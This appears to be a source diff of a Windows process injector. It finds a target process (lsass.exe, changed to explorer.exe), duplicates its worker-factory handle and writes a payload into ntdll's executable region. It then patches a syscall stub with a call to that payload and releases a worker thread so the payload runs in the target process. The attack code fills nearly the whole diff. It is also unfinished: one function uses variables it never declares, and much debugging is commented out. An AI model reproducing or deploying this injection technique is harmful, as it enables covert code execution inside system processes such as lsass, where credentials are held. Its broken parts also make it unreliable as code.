@@ -1,19 +1,67 @@
+//After 
+//- 0F 34
+//- 0F 05
+//- CD 2E
+//
+//must follow
+//- C2 XX XX
+//- C3
+
+//#include <winternl.h>
 ///*****This module contains code for the injector implementation.*****
 
 #include "global.h"
 #include "payload.h"
 #include "auxfuncs.h"
 
-#define TARGET_PROCESS_NAME L"lsass.exe"
+#define TARGET_PROCESS_NAME L"explorer.exe"
 #define NT_SYSCALL_START 0x0	///System call numbers always started with 0.
 #define NT_SYSCALL_END 0x1000	///0x1000 is the begin of win32k system calls and hence, the last possible NT syscall is 0xFFF.
 #define REL_JUMP_SIZE 5
 #define RT_SECTION_SIZE PAGE_SIZE
 #define RT_SECTION_RESERVED_BYTES 1024
 #define NTDLL_TEXT_OFFSET PAGE_SIZE
-#define NTDLL_TEXT_SIZE_WIN10 (1024 * 1008)
+#define NTDLL_TEXT_SIZE_WIN10 (1024 * 1012)
 #define WORKER_FACTORY_ALL_ACCESS 0xF00FF
+#define MAX_HOOK_LEN 0x100
 
+BYTE g_pHookBuffer[MAX_HOOK_LEN];
+HANDLE hEvent;
+volatile static ULONG_PTR sg_returnAddress;
+//static BYTE sg_
+
+typedef struct _WORKER_FACTORY_BASIC_INFORMATION
+{
+	LARGE_INTEGER Timeout;
+	LARGE_INTEGER RetryTimeout;
+	LARGE_INTEGER IdleTimeout;
+	BOOLEAN Paused;
+	BOOLEAN TimerSet;
+	BOOLEAN QueuedToExWorker;
+	BOOLEAN MayCreate;
+	BOOLEAN CreateInProgress;
+	BOOLEAN InsertedIntoQueue;
+	BOOLEAN Shutdown;
+	ULONG BindingCount;
+	ULONG ThreadMinimum;
+	ULONG ThreadMaximum;
+	ULONG PendingWorkerCount;
+	ULONG WaitingWorkerCount;
+	ULONG TotalWorkerCount;
+	ULONG ReleaseCount;
+	LONGLONG InfiniteWaitGoal;
+	PVOID StartRoutine;
+	PVOID StartParameter;
+	HANDLE ProcessId;
+	SIZE_T StackReserve;
+	SIZE_T StackCommit;
+	NTSTATUS LastThreadCreationStatus;
+} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;
+
+typedef struct _THREAD_LAST_SYSCALL_INFORMATION{
+	PVOID FirstArgument;
+	USHORT SystemCallNumber;
+} THREAD_LAST_SYSCALL_INFORMATION, *PTHREAD_LAST_SYSCALL_INFORMATION;
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
 	PVOID Object;
@@ -44,9 +92,9 @@ typedef struct _NT_SYSCALL_STUB {
 	BYTE movR64R64[3];
 	BYTE movR32Imm32;
 	ULONG syscallNumber;
-	USHORT intelSyscallInstruction;
-	BYTE ret;
-	BYTE nopPadding[5];
+//	USHORT intelSyscallInstruction;
+//	BYTE ret;
+//	BYTE nopPadding[5];
 } NT_SYSCALL_STUB, *PNT_SYSCALL_STUB;
 
 void dispError(NTSTATUS status) {
@@ -55,40 +103,124 @@ void dispError(NTSTATUS status) {
 	NtRaiseHardError(status, 1, 0, (PULONG_PTR)&dummy, 0, (PULONG)&dummy);
 }
 
-NTSTATUS openWorkerFactory(PHANDLE pWorkerFactory, HANDLE hProcess, HANDLE targetPid) {
+//int customFilter(PVOID exceptionAddress) {
+//	sg_returnAddress = (ULONG_PTR)exceptionAddress;
+//	//sg_returnAddress = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress;
+//	NtTerminateThread(NtCurrentThread(), STATUS_SUCCESS);
+//	return 0;
+//}
+
+DWORD auxThread(PVOID pThrdParam){
+	FILE_IO_COMPLETION_INFORMATION miniPacket = { 0 };
+	ULONG_PTR param4 = 0x0;
+	ULONG_PTR param5 = 0x0;
+	//CONTEXT errorContext;
+	NTSTATUS status = STATUS_SUCCESS;
+	//EXCEPTION_RECORD64 blah;
+	//blah.ExceptionAddress;
+	//LONG prevstate;
+	//PEXCEPTION_POINTERS ptrs = NULL;
+	//SYSTEM_PROCESS_INFORMATION info;
+	//info.
+	__try {
+	//NtSetEvent(hEvent, &prevstate);
+	//markee:
+	//	miniPacket.ApcContext = NULL;
+	//	miniPacket.KeyContext = NULL;
+	//	miniPacket.IoStatusBlock.Information = 0;
+	//	miniPacket.IoStatusBlock.Status = 0x0;
+	//	param4 = 0x0;
+	//	param5 = 0x0;
+		status = NtWaitForWorkViaWorkerFactory((HANDLE)pThrdParam, &miniPacket, 0x10, &param4, &param5);
+		//if (status)
+		//	dispError(status);
+		//goto markee;
+	}
+	//__except (EXCEPTION_EXECUTE_HANDLER) {
+	//	//GetExceptionInformation();
+	//	ptrs = (PEXCEPTION_POINTERS)_exception_info();
+	//	*(PULONG_PTR)&g_pHookBuffer[0] = ptrs->ExceptionRecord->ExceptionAddress;
+	//	//RtlCaptureContext(&errorContext);
+	//	//*(PULONG_PTR)&g_pHookBuffer[0] = errorContext.LastBranchFromRip;
+	//	//*(PULONG_PTR)&g_pHookBuffer[8] = errorContext.LastBranchToRip;
+	//	//*(PULONG_PTR)&g_pHookBuffer[0x10] = errorContext.LastExceptionFromRip;
+	//	//*(PULONG_PTR)&g_pHookBuffer[0x18] = errorContext.LastExceptionToRip;
+	//	//*(PULONG_PTR)&g_pHookBuffer[0x20] = errorContext.Rip;
+	//	
+	//	dispError(STATUS_ACCESS_VIOLATION);
+	//}
+	//__except (customFilter(((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress)) {
+	//__except (*(PULONG_PTR)&g_pHookBuffer[0] = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress) {
+	__except (sg_returnAddress = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress) {
+		__nop();
+		//dispError(STATUS_ACCESS_VIOLATION);
+	}
+	
+	return (DWORD)status;
+}
+
+NTSTATUS openWorkerFactory(PHANDLE pWorkerFactory, HANDLE hProcess, HANDLE targetPid, PHANDLE pLocalWorkerFactory) {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	HANDLE hLocalWorkerFactory = NULL;
 	HANDLE hRemoteWorkerFactory = NULL;
 	HANDLE hIoCompletion = NULL;
+	HANDLE hDummyThread = NULL;
 	static USHORT objIndex = 0;
 	ULONG handleInfoSize = 0;
 	SIZE_T handleInfoMemSize = 0;
 	PSYSTEM_HANDLE_INFORMATION_EX pHandleList = NULL;
 	SYSTEM_HANDLE_INFORMATION_EX handleInfo;
-
+	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo= { 0 };
+	ULONG returnlen;
+	//BYTE pGarbageBuf[0x20] = { 0xEB, 0xFE };
+	BYTE pGarbageBuf[0x20] = { 0 };
+	//HANDLE hEvent = NULL;
+	//FILE_IO_COMPLETION_INFORMATION completionInfo;
+	//ULONG threadGoal = 0x4;
+	//SIZE_T byteswritten;
+	PVOID pBase = (PVOID)&NtWaitForWorkViaWorkerFactory;
+	SIZE_T protSize = 0x1000;
+	ULONG oldprot;
+	//BYTE lastSyscallInfo[0x100];
+	//ULONG infoLength = 0;
+	//NtQueryIn
+	//completionInfo.ApcContext = NULL;
+	//completionInfo.IoStatusBlock.Information = 0x0;
+	//completionInfo.IoStatusBlock.Pointer = NULL;
+	//completionInfo.KeyContext = NULL;
+	//ULONG_PTR param4 = 0x0;
+	//*((USHORT*)pGarbageBuf) = 0xFEEB;
+	
+	//ULONG_PTR param5 = 0x0;
+	OBJECT_ATTRIBUTES thrdAttr = { 0x30 };
 	do {
 		if (pWorkerFactory)
 			*pWorkerFactory = NULL;
 
-		if (!pWorkerFactory || !hProcess || INVALID_HANDLE_VALUE == hProcess || !targetPid) {
+		if (pLocalWorkerFactory)
+			*pLocalWorkerFactory = NULL;
+
+		//LPTHREAD_START_ROUTINE
+		if (!pWorkerFactory || !hProcess || INVALID_HANDLE_VALUE == hProcess || !targetPid || !pLocalWorkerFactory) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
 		if (!objIndex) {
 			///We need this for the next call, and the parameters are quite uncritical.
-			status = NtCreateIoCompletion(&hIoCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 4);
+			status = NtCreateIoCompletion(&hIoCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 2);
 			if (status) {
 				hIoCompletion = NULL;
 				break;
 			}
-
+			
 			///We create an archetypal TpWorkerFactory object in order to later deduce the object type from it...  
-			status = NtCreateWorkerFactory(&hLocalWorkerFactory, WORKER_FACTORY_ALL_ACCESS, NULL, hIoCompletion, INVALID_HANDLE_VALUE, NtCurrentPeb(), NtCurrentTeb(), 0x2, 0, 0);
+			status = NtCreateWorkerFactory(&hLocalWorkerFactory, WORKER_FACTORY_ALL_ACCESS, NULL, hIoCompletion, NtCurrentProcess(), NtCurrentPeb(), NtCurrentTeb(), 0x2, 0, 0);
 			if (status) {
 				hLocalWorkerFactory = NULL;
 				break;
 			}
+			*pLocalWorkerFactory = hLocalWorkerFactory;
 		}
 
 		status = NtQuerySystemInformation(SystemExtendedHandleInformation, &handleInfo, sizeof(SYSTEM_HANDLE_INFORMATION_EX), &handleInfoSize);
@@ -154,8 +286,8 @@ NTSTATUS openWorkerFactory(PHANDLE pWorkerFactory, HANDLE hProcess, HANDLE targe
 		*pWorkerFactory = hRemoteWorkerFactory;
 	} while (status);
 
-	if (hLocalWorkerFactory)
-		NtClose(hLocalWorkerFactory);
+	//if (hLocalWorkerFactory)
+	//	NtClose(hLocalWorkerFactory);
 
 	if (hIoCompletion)
 		NtClose(hIoCompletion);
@@ -179,20 +311,246 @@ PVOID rvaToFileOffset(_In_ ULONG rva, _In_ PVOID pMemoryBase) {
 	return NULL;
 }
 
-#define MIN_VM_ACCESS_MASK ( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
+#define MIN_VM_ACCESS_MASK (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
+NTSTATUS prepareHookBuffer(PBYTE pHookBuffer, SIZE_T* pBufSize, ULONG_PTR targetNtFunction, ULONG_PTR payloadAddress) {
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	ULONG magic = 0xB8D18B4C;
+	ULONG stubLength = 4;
+	PBYTE pTargetNtFunction = (PBYTE)targetNtFunction;
+	//CONTEXT ctx;
+	dispError(0xC0000458);
 
-NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLONG injectionHookAddress, DWORD timeoutMilliseconds){
-	LARGE_INTEGER interval;
+
+	do {
+		if (!pHookBuffer || !pBufSize || !targetNtFunction || !payloadAddress) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (!*pBufSize) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (42 < ((PNT_SYSCALL_STUB)targetNtFunction)->syscallNumber) {
+			while (magic != *(PULONG)(targetNtFunction - stubLength)) {
+				stubLength++;
+				if (*pBufSize < stubLength) {
+					status = STATUS_INFO_LENGTH_MISMATCH;
+					break;
+				}
+			}
+			dispError((NTSTATUS)stubLength + 0xC0000000);
+		}
+		else {
+			while (magic != *(PULONG)(targetNtFunction + stubLength)) {
+				stubLength++;
+				if (*pBufSize < stubLength) {
+					status = STATUS_INFO_LENGTH_MISMATCH;
+					break;
+				}
+			}
+			dispError((NTSTATUS)stubLength + 0xC0000000);
+		}
+
+		*pBufSize = stubLength;
+		for (ULONG i = 0; i < stubLength; i++)
+			pHookBuffer[i] = pTargetNtFunction[i];
+
+
+		//NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
+		//status = NtCreateThread(&hIoCompletion, THREAD_ALL_ACCESS, &thrdAttr)
+		status = NtCreateThreadEx(&hDummyThread, THREAD_ALL_ACCESS, &thrdAttr, NtCurrentProcess(), &auxThread, hLocalWorkerFactory, 0x0, 0x0, 0x0, 0x0, NULL);
+		if (status) {
+			hDummyThread = NULL;
+			break;
+		}//dispError(status);
+
+		while (!status && !workerFactoryInfo.WaitingWorkerCount) {
+			workerFactoryInfo.WaitingWorkerCount = 0;
+			status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
+		}
+		//workerFactoryInfo
+		if (status)
+			break;
+
+		//dispError(0x80000001);
+		//dispError(0x40000001);
+		//while (!status && (hLocalWorkerFactory != ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument))
+		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, returnlen, &returnlen);
+
+		//if (status)
+		//	break;
+		////infoLength = 1;
+		//NtSuspendThread(hDummyThread, &returnlen);
+		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, 0x18, &returnlen);
+		//NtResumeThread(hDummyThread, &returnlen);
+		//dispError(status);
+		//for (ULONG i = 1; i < sizeof(lastSyscallInfo); i++) {
+		//	//dispError(status);
+		//	status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, i, &returnlen);
+		//	if (!status) {
+		//		dispError(0x80000000 + (NTSTATUS)i);
+		//		infoLength = i;
+		//		break;
+		//	}
+		//}
+		//while(STATUS_INFO_LENGTH_MISMATCH)
+		//NtSuspendThread(hDummyThread, &returnlen);
+		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, 0x18, &returnlen);
+		//NtResumeThread(hDummyThread, &returnlen);
+		//	infoLength = 1;
+		//	for (ULONG i = 1; i < sizeof(lastSyscallInfo); i++) {
+		//		//if (!infoLength)
+		//			//infoLength = i;
+		//		//infoLength = returnlen ? returnlen : i;
+		//		//dispError(0xC0000000 + (NTSTATUS)infoLength);
+		//		((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument = NULL;
+		//		status = NtSuspendThread(hDummyThread, &returnlen);
+		//		dispError(status);
+		//		status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, infoLength, &returnlen);
+		//		NtResumeThread(hDummyThread, &returnlen);
+		//		if (!status) {
+		//			dispError(0x80000000 + (NTSTATUS)i);
+		//			//returnlen = i;	///We found a working information length, save it
+		//			if(hLocalWorkerFactory == ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument)
+		//				break;
+
+		//			i = 0;
+		//		}
+		//		else {
+		//			infoLength = i;
+		//			//returnlen = 0;
+		//		}
+		//	}
+
+		//	if (status)
+		//		break;
+		//	
+		//	//while (!status && (hLocalWorkerFactory != ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument))
+		//	//	status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, returnlen, &returnlen);
+
+		//	//if (status)
+		//	//	break;
+
+		//	dispError(0xC0000000+(NTSTATUS)(ULONG_PTR)((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument);
+
+		//	//0:000> dt _THREAD_LAST_SYSCALL_INFORMATION
+		//	//	twinui!_THREAD_LAST_SYSCALL_INFORMATION
+		//	//	+ 0x000 FirstArgument    : Ptr64 Void
+		//	//	+ 0x008 SystemCallNumber : Uint2B
+		//	//	+ 0x00a Pad : [3] Uint2B
+		//	//	+ 0x010 WaitTime : Uint8B
+		//	//for (ULONG i = 4; i < sizeof(lastSyscallInfo); i += 4) {
+		//	//	
+		//	//}
+		////	NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, )
+		//	//THREAD_BASIC_INFORMATION blah;
+		//	
+		//	//while (status == !workerFactoryInfo.WaitingWorkerCount) {
+		//	//	status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
+		//	//if(status)
+		//	//}
+		//	//dispError((NTSTATUS)workerFactoryInfo.WaitingWorkerCount);
+		//	//status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
+		//	//if (status) {
+		//	//	hDummyThread = NULL;
+		//	//	break;
+		//	//}
+		//	//dispError((NTSTATUS)workerFactoryInfo.WaitingWorkerCount);
+
+		//	//NtWaitForSingleObject(hEvent, FALSE, NULL);
+		status = NtProtectVirtualMemory(NtCurrentProcess(), &pBase, &protSize, PAGE_EXECUTE_READWRITE, &oldprot);
+		if (status) {
+			hIoCompletion = NULL;
+			break;
+		}
+		//status = NtWriteVirtualMemory(NtCurrentProcess(), (PVOID)&NtWaitForWorkViaWorkerFactory, pGarbageBuf, 0x20, &byteswritten);
+		//if (status) {
+		//	hIoCompletion = NULL;
+		//	break;
+		//}
+		RtlCopyMemory((PVOID)&NtWaitForWorkViaWorkerFactory, pGarbageBuf, 0x20);
+		//status = NtSetIoCompletion(hIoCompletion, &hIoCompletion, &hLocalWorkerFactory, 0x0, 0x20);
+		////status = NtSetIoCompletionEx(hIoCompletion, NULL, &hLocalWorkerFactory, pWorkerFactory, STATUS_SUCCESS, 0x20);
+		//dispError(status+1);
+		status = NtReleaseWorkerFactoryWorker(hLocalWorkerFactory);
+		NtTerminateThread(hIoCompletion, 0x0);
+		//NtWaitForSingleObject(hIoCompletion, FALSE, NULL);
+		//*(PULONG_PTR)g_pHookBuffer = sg_returnAddress;
+		//dispError(STATUS_DRIVERS_LEAKING_LOCKED_PAGES);
+		//NtTerminateThread(hIoCompletion, 0x0);
+		//if (*((PULONG_PTR)g_pHookBuffer)) {
+		//	dispError(0xC0000100);
+		//}
+		dispError(STATUS_DRIVERS_LEAKING_LOCKED_PAGES + 1);
+		//status = NtSetInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryAdjustThreadGoal, &threadGoal, sizeof(ULONG));
+		//dispError(status);
+		//status = NtWorkerFactoryWorkerReady(hLocalWorkerFactory);
+		//dispError(status);
+		//for (ULONG_PTR i = 4; i < 0x1000; i += 4) {
+		//completionInfo.ApcContext = NULL;
+		//completionInfo.IoStatusBlock.Information = 0x0;
+		//completionInfo.IoStatusBlock.Pointer = NULL;
+		//completionInfo.KeyContext = NULL;
+		//////completionInfo.blah = NULL;
+		////completionInfo.ApcContext = (PVOID)&completionInfo.ApcContext;
+		////completionInfo.IoStatusBlock.Information = 0x20;
+		////completionInfo.IoStatusBlock.Pointer = (PVOID)&completionInfo.IoStatusBlock.Pointer;
+		////completionInfo.KeyContext = (PVOID)&completionInfo.KeyContext;
+		////completionInfo.blah = (PVOID)&completionInfo.blah;
+		//param4 = 0;
+		//param5 = 0;
+		//status = NtWaitForWorkViaWorkerFactory(hLocalWorkerFactory, &completionInfo, 0x10, &param4, &param5);
+		//status = NtReleaseWorkerFactoryWorker(hLocalWorkerFactory);
+		//	dispError(status);
+		//}
+		//NtGetContextThread()
+
+
+		for (ULONG i = 4; i < stubLength - 3; i++) {
+			if ((0x050F == *(PSHORT)&pHookBuffer[i]) ||
+				(0x340F == *(PSHORT)&pHookBuffer[i]) ||
+				(0x2ECD == *(PSHORT)&pHookBuffer[i])) {
+				//if (0xC3 == pHookBuffer[i + 2] || 0xC2 == pHookBuffer[i + 2]) {
+				if (0xC3 == pHookBuffer[i + 2]){	
+					pHookBuffer[i + 2] = 0xE8;
+					*(PULONG)&pHookBuffer[i + 3] = (ULONG)(payloadAddress - ((targetNtFunction + (i + 2)) + 5));
+					status = STATUS_SUCCESS;
+					break;
+					//i += 5;
+				}
+			}
+		}
+
+		for (ULONG i = 0; i < stubLength; i++)
+			g_pHookBuffer[i] = pHookBuffer[i];
+
+		if (status)
+			break;
+
+	} while (status);
+	return status;
+}
+
+
+NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONG_PTR injectionHookAddress){
+	//LARGE_INTEGER interval;
 	SIZE_T bytesWritten;
-	ULONG callDisplacement;
+	//ULONG callDisplacement;
 	ULONG_PTR bootstrapAddress;
 	ULONG oldHookProtect = 0x0;
 	PVOID pNtdllRxBegin = NULL;
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	SIZE_T bytesToProtect = PAGE_SIZE;
-	USHORT lineNum = 0;
-	ULONG injectionCode[] = { 0xE890050F, 0xBBBBBBBB };
-	ULONG* pSyscallArray = (PULONG)((ULONG_PTR)&bootstrapCodeBegin + 0x60);
+	//USHORT lineNum = 0;
+	SIZE_T hooklen = MAX_HOOK_LEN;
+	BYTE hookBuffer[MAX_HOOK_LEN];
+	//BYTE injectionCode[] = { 0xE8, 0xBB, 0xBB, 0xBB, 0xBB };
+	//ULONG injectionCode[] = { 0xE890050F, 0xBBBBBBBB };
+	ULONG* pSyscallArray = (PULONG)((ULONG_PTR)&bootstrapCodeBegin + 0x28);
+	HANDLE hRemoteEvent = NULL;
+//	HANDLE hEvent = NULL;
 	//ULONG_PTR* pLdrGetProcedureAddress = (PULONG_PTR)((ULONG_PTR)&bootstrapCodeBegin + 0x40);
 	//ANSI_STRING aMessageBeep;
 	//UNICODE_STRING uKernelbaseDll;
@@ -200,15 +558,35 @@ NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLO
 	//RtlInitUnicodeString(&uKernelbaseDll, L"user32.dll");
 	//RtlInitAnsiString(&aMessageBeep, "MessageBeep");
 	//PMESSAGE_BEEP fpMessageBeep = NULL;
-	interval.QuadPart = timeoutMilliseconds * (long long)(-10000);
+	//interval.QuadPart = timeoutMilliseconds * (long long)(-10000);
+
 	//MessageBeep(MB_ICONEXCLAMATION);
 	do {
+		status = openWorkerFactory(&hWorkerFactory, hProcess, cid.UniqueProcess);
+		if (status)
+			continue;
+
+		status = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
+		if (status)
+			break;
+
+		status = NtDuplicateObject(NtCurrentProcess(), hEvent, hProcess, &hRemoteEvent, EVENT_ALL_ACCESS, DUPLICATE_SAME_ATTRIBUTES, 0x0);
+		if (status)
+			break;
+		dispError((NTSTATUS)(ULONG_PTR)hRemoteEvent + 0xC0000000);
+
 		bytesToProtect = NTDLL_TEXT_SIZE_WIN10;	///<=== VERY bad. ntdll RX size is hardcoded!
 		pNtdllRxBegin = (PVOID)(NTDLL_TEXT_OFFSET + (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
 		bootstrapAddress = (ULONG_PTR)pNtdllRxBegin + bytesToProtect - RT_SECTION_SIZE + RT_SECTION_RESERVED_BYTES;	///Last 3 KB of RT section
-		callDisplacement = (ULONG)(bootstrapAddress - (injectionHookAddress + 3) - REL_JUMP_SIZE);	///3 is due to injectionHookAddress != jmp instruction address.
-		injectionCode[1] = callDisplacement;
-		g_originalSyscallCode = *(PULONGLONG)injectionHookAddress;
+		//callDisplacement = (ULONG)(bootstrapAddress - (injectionHookAddress + 3) - REL_JUMP_SIZE);	///3 is due to injectionHookAddress != jmp instruction address.
+		//callDisplacement = (ULONG)(bootstrapAddress+0x80 - (injectionHookAddress + 3) - REL_JUMP_SIZE);
+		//injectionCode[1] = callDisplacement;
+		status = prepareHookBuffer(hookBuffer, &hooklen, injectionHookAddress, bootstrapAddress+0x80);
+		if (status)
+			break;
+		//g_returnInstruction[0] = 0xC3;
+		g_resumationHandle = (ULONG_PTR)hRemoteEvent;
+		//g_originalSyscallCode = *(PULONGLONG)injectionHookAddress;
 		//status = LdrLoadDll(NULL, NULL, &uKernelbaseDll, &pKernelbase);
 		//if (status)
 		//	break;
@@ -224,13 +602,17 @@ NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLO
 
 		//*pLdrGetProcedureAddress = (ULONG_PTR)fpMessageBeep;
 		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtRaiseHardError)->syscallNumber;
-		pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtDelayExecution)->syscallNumber;
-		pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtOpenFile)->syscallNumber;
-		pSyscallArray[2] = ((PNT_SYSCALL_STUB)NtDeviceIoControlFile)->syscallNumber;
-		pSyscallArray[3] = ((PNT_SYSCALL_STUB)NtClose)->syscallNumber;
-		pSyscallArray[4] = ((PNT_SYSCALL_STUB)NtCreateSemaphore)->syscallNumber;
-		pSyscallArray[5] = ((PNT_SYSCALL_STUB)NtOpenProcess)->syscallNumber;
-		pSyscallArray[6] = ((PNT_SYSCALL_STUB)NtCreateMutant)->syscallNumber;
+		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtDelayExecution)->syscallNumber;
+		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtSuspendThread)->syscallNumber;
+		pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtWaitForSingleObject)->syscallNumber;
+		pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtSetEvent)->syscallNumber;
+		//pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtCreateMutant)->syscallNumber;
+		pSyscallArray[2] = ((PNT_SYSCALL_STUB)NtOpenFile)->syscallNumber;
+		pSyscallArray[3] = ((PNT_SYSCALL_STUB)NtDeviceIoControlFile)->syscallNumber;
+		pSyscallArray[4] = ((PNT_SYSCALL_STUB)NtClose)->syscallNumber;
+		pSyscallArray[5] = ((PNT_SYSCALL_STUB)NtCreateSemaphore)->syscallNumber;
+		pSyscallArray[6] = ((PNT_SYSCALL_STUB)NtOpenProcess)->syscallNumber;
+
 		//myWPrintf(&lineNum, L"ptr %llx", *pLdrGetProcedureAddress);
 
 		//myWPrintf(&lineNum, L"ptr %p", pLdrGetProcedureAddress);
@@ -239,30 +621,54 @@ NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLO
 		if (status)
 			break;
 
-		status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress+0x100), (PVOID)payloadRoutineBegin, (ULONG_PTR)payloadRoutineEnd - (ULONG_PTR)payloadRoutineBegin, &bytesWritten);
+		status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress+0x80), (PVOID)payloadRoutineBegin, (ULONG_PTR)payloadRoutineEnd - (ULONG_PTR)payloadRoutineBegin, &bytesWritten);
+		//status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress + 0x100), (PVOID)payloadRoutineBegin, 464, &bytesWritten);
+		if (status)
+			break;
+		
+		//NtTerminateThread()
+		//NtSuspendProcess(hProcess);
+		//status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
+		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, hookBuffer, hooklen, &bytesWritten);
 		if (status)
 			break;
 
-		NtSuspendProcess(hProcess);
-		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
-		if (status)
+		status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
+		dispError(status);
+
+		status = NtWaitForSingleObject(hEvent, FALSE, NULL);
+		if (STATUS_TIMEOUT == status)
 			break;
 
+		NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, (PVOID)injectionHookAddress, hooklen, &bytesWritten);
+		NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
+		dispError(status);
+		//status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
 	} while (status);
-
+	
+	
+	
 	//if (pKernelbase)
 	//	LdrUnloadDll(pKernelbase);
+	//NtCreateMutant()
+	//myWPrintf(&lineNum, L"aosdhfiu0x%llxwreev", g_bootstrapCodeBegin);
 
-	myWPrintf(&lineNum, L"aosdhfiu0x%llxwreev", g_bootstrapCodeBegin);
+	
+	//NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
+	//NtSuspendProcess()
+	//dispError(status);
+	//NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
+	//dispError(status);
 
-	status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
-	NtDelayExecution(FALSE, &interval);
-	NtResumeProcess(hProcess);
-	NtDelayExecution(FALSE, &interval);
-	NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
+	//NtDelayExecution(FALSE, &interval);
+	//NtResumeProcess(hProcess);
+	//NtDelayExecution(FALSE, &interval);
+	//NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
 
 	return status;
 }
+
+
 
 NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN useDebugPrivilege) {
 	SYSTEM_PROCESS_INFORMATION procInfo;
@@ -331,30 +737,35 @@ NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN us
 			//	fla = TRUE;
 			//	continue;
 			//}
+			
 			cid.UniqueProcess = pProcEntry->UniqueProcessId;
 			if (hProcess)
 				NtClose(hProcess);
-
-			status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &procAtttr, &cid);
+			//cid.UniqueProcess = (HANDLE)5400;
+			status = NtOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &procAtttr, &cid);
 			if (status) {
 				hProcess = NULL;
 				continue;
 			}
-
